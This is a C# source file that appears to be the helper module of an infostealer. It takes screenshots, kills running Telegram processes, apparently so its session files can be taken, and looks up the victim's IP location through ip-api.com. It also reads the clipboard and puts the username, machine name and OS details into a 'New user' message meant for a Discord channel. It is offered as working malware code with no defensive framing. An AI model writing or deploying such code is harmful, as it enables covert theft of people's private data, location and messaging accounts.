using NAudio.Wave;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text.Encodings.Web;
using System.Text.Json;
using System.Text.Unicode;
using static System.Net.Mime.MediaTypeNames;

namespace Vollmond
{
    public class Auxiliary
    {


        public static async Task PlaysoundAsync(string url_sound)
        {
            using (var mf = new MediaFoundationReader(url_sound))
            using (var wo = new WasapiOut())
            {
                var tcs = new TaskCompletionSource<bool>();
                wo.PlaybackStopped += (s, e) => tcs.TrySetResult(true);

                wo.Init(mf);
                wo.Play();

                await tcs.Task.ConfigureAwait(false);
            }
        }

        public static string MakeScreenshot() // Return path to the screenshot
        {
            Bitmap bitmap = H.Utilities.Screenshoter.Shot();

            bitmap.Save(Path.Combine(Path.GetTempPath(), "screenshot.png"), System.Drawing.Imaging.ImageFormat.Png);

            string pathToScreen = Path.Combine(Path.GetTempPath(), "screenshot.png");
            return pathToScreen;
        }
        public static bool IsTelegramDesktopDirectoryExists(string path)
        {
            if (Path.Exists(path))
                return true;
            else
                return false;
        }

        public static void KillTelegram()
        {
            foreach (var process in Process.GetProcessesByName("Telegram"))
            {
                try { process.Kill(); process.WaitForExit(); } catch { }
            }
            Thread.Sleep(500);
        }

        public static async Task<string> GetSystemInfo() // Returning json-payload for discord
        {
            HttpClient httpClient_ip = new HttpClient();

            string ip_info_json;

            try
            {
                using var request_ip = new HttpRequestMessage(HttpMethod.Get, "http://ip-api.com/json/?lang=en&fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query");

                using var response_ip = await httpClient_ip.SendAsync(request_ip);
                string responseIP_text = await response_ip.Content.ReadAsStringAsync();

                var jsonElement = JsonSerializer.Deserialize<JsonElement>(responseIP_text);
                ip_info_json = JsonSerializer.Serialize(jsonElement, new JsonSerializerOptions
                {
                    WriteIndented = true,
                    Encoder = JavaScriptEncoder.Create(UnicodeRanges.BasicLatin, UnicodeRanges.Cyrillic)
                });
            }
            catch (Exception except)
            {
                ip_info_json = $"[ERROR WHILE EXTRACTING JSON, OR WHILE REQUESTING TO IP-API.COM: {except}]";
            }

            string clipboard_text = "[THERE IS NO TEXT OR IT'S NOT A TEXT]";
            Thread GetClip = new Thread(() =>
            {
                switch (Clipboard.ContainsText())
                {
                    case true:
                        clipboard_text = Clipboard.GetText();
                        break;

                    case false:
                        clipboard_text = "[THERE IS NO TEXT OR IT'S NOT A TEXT]";
                        break;
                }
            });
            GetClip.SetApartmentState(ApartmentState.STA);
            GetClip.Start();
            GetClip.Join();

            if (clipboard_text.Length > 700)
            {
                clipboard_text.Remove(700); // Discord message, have an limit for 2000 simbols
            }

            string discord_payload = $"""
            ## New user: **{Environment.UserName}\{Environment.MachineName}**
            
            *Ip-info:* ```{ip_info_json}```

            OS: {Environment.OSVersion} 
            OS Architecture: {RuntimeInformation.OSArchitecture}
            Processor count: {Environment.ProcessorCount}

            *Clipboard:* ```{clipboard_text}```
            """;

            return discord_payload;
        }
    }
}
